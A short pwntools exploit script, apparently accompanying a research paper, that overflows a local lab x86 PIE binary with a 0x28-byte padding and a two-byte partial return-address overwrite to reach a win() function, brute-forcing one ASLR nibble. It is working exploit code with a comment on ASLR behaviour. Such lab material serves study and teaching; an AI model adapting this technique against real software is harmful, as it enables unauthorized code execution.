from pwn import *


binary = "../x86_binaries/x86_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
print("====== NOTE - this has a 1/16 change of working ======")
p.sendline(b'echo \'[+] $gp register successfully modified\'')
sleep(0.5)                          # short delay to separate the two read() calls

payload = flat(
    b'a'*0x28,
    b'\xce\x01',                    # partial overwrite of $rip to point to win()+1
)
p.send(payload)
p.interactive()
p.close()

"""
In all of the MIPS binaries, the last 4 nibbles of ASLR are constant between runs. In this
x86 binary, only the last 3 nibbles are constant. This means that we always know 3 of the 4
nibbles, and have to brute force the last one (which has 16 options).

The number of ASLR bits and which bits those are depend on your kernel/system configuration,
and since that may differ across devices this specific issue is not detailed further in the
paper.
"""